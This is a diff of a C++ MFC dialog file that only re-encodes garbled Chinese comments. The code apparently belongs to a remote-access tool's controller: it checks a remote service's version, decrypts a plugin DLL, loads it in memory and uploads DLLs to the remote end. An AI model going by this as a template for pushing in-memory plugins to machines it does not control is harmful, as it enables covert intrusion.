@@ -1,4 +1,4 @@
-ï»¿// DllDlg.cpp : implementation file
+// DllDlg.cpp : implementation file
 //
 
 #include "stdafx.h"
@@ -64,11 +64,11 @@ void CDllDlg::OnReceiveComplete()
 		break;
 	case TOKEN_DLLLOADERROR:
 		{
-			m_strOperatingFile = m_strOperatingPath + (char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1); //é‡ä¼ æ—¶ä¹Ÿå‘é€äº†ä¸€ä¸ªæ–‡ä»¶å
-//			AfxMessageBox("è¦æ±‚é‡ä¼ ");
+			m_strOperatingFile = m_strOperatingPath + (char *)m_pContext->m_DeCompressionBuffer.GetBuffer(1); //ÖØ´«Ê±Ò²·¢ËÍÁËÒ»¸öÎÄ¼şÃû
+//			AfxMessageBox("ÒªÇóÖØ´«");
 // 			CString str;
-// 			str.Format("åŠ è½½æœåŠ¡ç«¯å¤±è´¥æ˜¯å¦é‡ä¼ ?\n");
-// 			if(::MessageBox(m_hWnd, str.GetBuffer(0),"æç¤º:",MB_YESNO)==IDYES)
+// 			str.Format("¼ÓÔØ·şÎñ¶ËÊ§°ÜÊÇ·ñÖØ´«?\n");
+// 			if(::MessageBox(m_hWnd, str.GetBuffer(0),"ÌáÊ¾:",MB_YESNO)==IDYES)
 				SendUploadJob();
 // 			else
 // 				::SendMessage(m_hWnd,WM_CLOSE,0,0);
@@ -83,7 +83,7 @@ void CDllDlg::OnReceiveComplete()
 		SendFileData();
 		break;
 	default:
-		// ä¼ è¾“å‘ç”Ÿå¼‚å¸¸æ•°æ®
+		// ´«Êä·¢ÉúÒì³£Êı¾İ
 		break;
 	}
 }
@@ -106,7 +106,7 @@ BOOL CDllDlg::OnInitDialog()
 	memset(&sockAddr, 0, sizeof(sockAddr));
 	int nSockAddrLen = sizeof(sockAddr);
 	BOOL bResult = getpeername(m_pContext->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);
-	str.Format("\\\\%s - æ£€æµ‹æœåŠ¡ç«¯ç‰ˆæœ¬", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
+	str.Format("\\\\%s - ¼ì²â·şÎñ¶Ë°æ±¾", bResult != INVALID_SOCKET ? inet_ntoa(sockAddr.sin_addr) : "");
 	SetWindowText(str);
 	m_dlldlg_progress.SetRange(0, 100);
 	m_dlldlg_progress.SetPos(0);
@@ -128,7 +128,7 @@ void CDllDlg::OnClose()
 	DestroyWindow();
 }
 
-void DecryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key)//è§£å¯†
+void DecryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key)//½âÃÜ
 {
 	unsigned long i;
 	unsigned char p;
@@ -146,13 +146,13 @@ void DecryptPlug(unsigned char *szRec, unsigned long nLen, unsigned long key)//è
 void CDllDlg::GetServerVersion()
 {
 	HMEMORYMODULE  hdllmod;
-	//ç‰ˆæœ¬æ¯”è¾ƒ
-	char	*lpSerVer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)); //æœåŠ¡ç‰ˆæœ¬
+	//°æ±¾±È½Ï
+	char	*lpSerVer = (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1)); //·şÎñ°æ±¾
 	m_strOperatingFile = m_strOperatingPath + (char *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1 + lstrlen(lpSerVer) + 1));
 	
 	if(GetFileAttributes(m_strOperatingFile.GetBuffer(0)) != -1)
 	{
-		hDllFile =CreateFile(m_strOperatingFile.GetBuffer(0),GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);//è¿™é‡Œç¬¬ä¸€ä¸ªå‚æ•°è°ƒç”¨ä¸Šé¢é‚£ä¸ªGetModuleFileName
+		hDllFile =CreateFile(m_strOperatingFile.GetBuffer(0),GENERIC_READ,0,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);//ÕâÀïµÚÒ»¸ö²ÎÊıµ÷ÓÃÉÏÃæÄÇ¸öGetModuleFileName
 		SizeDll  =GetFileSize(hDllFile,0);
 		MemDll   =VirtualAlloc(0,SizeDll,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
 		ReadFile(hDllFile,MemDll,SizeDll,&BytesRead,0);
@@ -176,15 +176,15 @@ void CDllDlg::GetServerVersion()
 			
  			if (strcmp(strdllversion,lpSerVer))
 // 			{
-// 				AfxMessageBox("ç›¸åŒ"); //è¿™é‡Œè°ƒç”¨ONCLOSEæ—¶ä¼šé‡æ–°è°ƒç”¨æ¬¡INITDLG
+// 				AfxMessageBox("ÏàÍ¬"); //ÕâÀïµ÷ÓÃONCLOSEÊ±»áÖØĞÂµ÷ÓÃ´ÎINITDLG
 // 				Sleep(1000);
 // 				OnClose();
 // 			}
 // 			else
 			{
 				CString str;
-				str.Format("å‘ç°æœåŠ¡ç«¯ç‰ˆæœ¬ä¸æœ¬åœ°ä¸ä¸€è‡´, æ˜¯å¦é‡ä¼ ?\næœåŠ¡ç«¯ç‰ˆæœ¬: %s\nå®¢æˆ·ç«¯ç‰ˆæœ¬: %s",lpSerVer,strdllversion);
-				if(::MessageBox(m_hWnd, str.GetBuffer(0),"æç¤º:",MB_YESNO|MB_ICONQUESTION)==IDYES)
+				str.Format("·¢ÏÖ·şÎñ¶Ë°æ±¾Óë±¾µØ²»Ò»ÖÂ, ÊÇ·ñÖØ´«?\n·şÎñ¶Ë°æ±¾: %s\n¿Í»§¶Ë°æ±¾: %s",lpSerVer,strdllversion);
+				if(::MessageBox(m_hWnd, str.GetBuffer(0),"ÌáÊ¾:",MB_YESNO|MB_ICONQUESTION)==IDYES)
 				{
 					SendUploadJob();
 					return ;
@@ -202,7 +202,7 @@ void CDllDlg::GetServerVersion()
 		}
 	}
 	
-	//	AfxMessageBox("è·å–æœ¬åœ°ç‰ˆæœ¬å¤±è´¥,å°è¯•å¯åŠ¨æœåŠ¡!");
+	//	AfxMessageBox("»ñÈ¡±¾µØ°æ±¾Ê§°Ü,³¢ÊÔÆô¶¯·şÎñ!");
 	LPBYTE	lpPacket = new BYTE[dwSizeofbuff + 1];
 	lpPacket[0] = COMMAND_DLLOK;
 	memcpy(lpPacket + 1, lparam, dwSizeofbuff);
@@ -279,16 +279,16 @@ void CDllDlg::SendFileData()
 	
 	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);
 	
-	int		nHeadLength = 9; // 1 + 4 + 4  æ•°æ®åŒ…å¤´éƒ¨å¤§å°ï¼Œä¸ºå›ºå®šçš„9
+	int		nHeadLength = 9; // 1 + 4 + 4  Êı¾İ°üÍ·²¿´óĞ¡£¬Îª¹Ì¶¨µÄ9
 	
 	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
 	DWORD	nNumberOfBytesRead = 0;
 	BYTE	*lpBuffer = (BYTE *)LocalAlloc(LPTR, MAX_SEND_BUFFER);
-	// Token,  å¤§å°ï¼Œåç§»ï¼Œæ•°æ®
+	// Token,  ´óĞ¡£¬Æ«ÒÆ£¬Êı¾İ
 	lpBuffer[0] = COMMAND_FILE_DATA;
 	memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
 	memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));	
-	// è¿”å›å€¼
+	// ·µ»ØÖµ
 	bool	bRet = true;
 	ReadFile(hFile, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
 	CloseHandle(hFile);
@@ -305,9 +305,9 @@ void CDllDlg::ShowProgress()
 {
  	char	*lpDirection = NULL;
 // 	if (m_bIsUpload)
-// 		lpDirection = "ä¼ é€æ–‡ä»¶";
+// 		lpDirection = "´«ËÍÎÄ¼ş";
 // 	else
- 		lpDirection = "æ¥æ”¶æ–‡ä»¶";
+ 		lpDirection = "½ÓÊÕÎÄ¼ş";
 	
 	m_dlldlg_progress.ShowWindow(SW_NORMAL);
 	if ((int)m_nCounter == -1)
@@ -322,7 +322,7 @@ void CDllDlg::ShowProgress()
 	if (m_nCounter == m_nOperatingFileLength)
 	{
 		m_nCounter = m_nOperatingFileLength = 0;
-		// å…³é—­æ–‡ä»¶å¥æŸ„
+		// ¹Ø±ÕÎÄ¼ş¾ä±ú
 	}
 }
 
@@ -334,16 +334,16 @@ void CDllDlg::EndLocalUploadFile()
 	
 // 	if ( m_bIsStop)
 // 	{
-// 		//åŠ è½½å®Œæˆ
+// 		//¼ÓÔØÍê³É
 // 	}
 // 	else
 // 	{
-// 		// æˆ‘é ï¼Œä¸sleepä¸‹ä¼šå‡ºé”™ï¼Œæœäº†å¯èƒ½ä»¥å‰çš„æ•°æ®è¿˜æ²¡sendå‡ºå»
+// 		// ÎÒ¿¿£¬²»sleepÏÂ»á³ö´í£¬·şÁË¿ÉÄÜÒÔÇ°µÄÊı¾İ»¹Ã»send³öÈ¥
 // 		Sleep(5);
 // 		SendUploadJob();
 // 		
 // 	}
-//	AfxMessageBox("ä¸Šä¼ å®Œæˆ!");
+//	AfxMessageBox("ÉÏ´«Íê³É!");
 	
 	LPBYTE	lpPacket = new BYTE[dwSizeofbuff + 1];
 	lpPacket[0] = COMMAND_DLLOK;
@@ -357,14 +357,14 @@ BOOL CDllDlg::SendUploadJob()
 {
 	DWORD	dwSizeHigh;
 	DWORD	dwSizeLow;
-	// 1 å­—èŠ‚token, 8å­—èŠ‚å¤§å°, æ–‡ä»¶åç§°, '\0'
+	// 1 ×Ö½Útoken, 8×Ö½Ú´óĞ¡, ÎÄ¼şÃû³Æ, '\0'
 	HANDLE	hFile;
-	CString	fileRemote = m_strOperatingFile; // è¿œç¨‹æ–‡ä»¶
+	CString	fileRemote = m_strOperatingFile; // Ô¶³ÌÎÄ¼ş
 	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
 	if (hFile == INVALID_HANDLE_VALUE)
 	{
 		CString msg;
-		msg.Format("æœ¬åœ°æ–‡ä»¶ %s æœªæ‰¾åˆ°", m_strOperatingFile);
+		msg.Format("±¾µØÎÄ¼ş %s Î´ÕÒµ½", m_strOperatingFile);
 		AfxMessageBox(msg);
 		::SendMessage(m_hWnd,WM_CLOSE,0,0);
 		return FALSE;
@@ -373,7 +373,7 @@ BOOL CDllDlg::SendUploadJob()
 	m_nOperatingFileLength = ((__int64)dwSizeHigh << 32) + dwSizeLow;
 	
 	CloseHandle(hFile);
-	// æ„é€ æ•°æ®åŒ…ï¼Œå‘é€æ–‡ä»¶é•¿åº¦
+	// ¹¹ÔìÊı¾İ°ü£¬·¢ËÍÎÄ¼ş³¤¶È
 	int		nPacketSize = 9;//fileRemote.GetLength() + 10;
 	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);
 	memset(bPacket, 0, nPacketSize);
